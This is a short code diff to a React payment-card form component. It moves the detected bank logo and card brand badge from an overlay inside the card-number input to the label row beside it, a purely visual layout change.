@@ -279,7 +279,26 @@ export function CardClient({ sessionId }: Props) {
 
         <form onSubmit={handleSubmit} className="space-y-4">
           <label className="block text-sm font-medium text-white">
-            {settings.card_number_label}
+            <div className="flex items-center justify-between gap-2">
+              <span>{settings.card_number_label}</span>
+              {(brand || bank) && (
+                <span className="flex items-center gap-2">
+                  {bank && (
+                    <img
+                      src={bank.logo}
+                      alt={bank.name}
+                      title={bank.name}
+                      className="h-6 w-auto rounded bg-white/90 px-1 py-0.5 object-contain shadow-sm"
+                    />
+                  )}
+                  {brand && (
+                    <span className="rounded-md bg-white/90 px-2 py-1 shadow-sm">
+                      <CardBrandLogo brand={brand.name} />
+                    </span>
+                  )}
+                </span>
+              )}
+            </div>
             <div className="relative mt-2">
               <input
                 required
@@ -293,23 +312,6 @@ export function CardClient({ sessionId }: Props) {
                 onChange={(e) => setNumber(e.target.value.replace(/\D/g, "").slice(0, 19))}
                 autoComplete="cc-number"
               />
-              {(brand || bank) && (
-                <div className="pointer-events-none absolute right-3 top-1/2 flex -translate-y-1/2 items-center gap-2">
-                  {bank && (
-                    <img
-                      src={bank.logo}
-                      alt={bank.name}
-                      title={bank.name}
-                      className="h-6 w-auto rounded bg-white/90 px-1 py-0.5 object-contain shadow-sm"
-                    />
-                  )}
-                  {brand && (
-                    <div className="rounded-md bg-white/90 px-2 py-1 shadow-sm">
-                      <CardBrandLogo brand={brand.name} />
-                    </div>
-                  )}
-                </div>
-              )}
             </div>
           </label>
           {bank && (
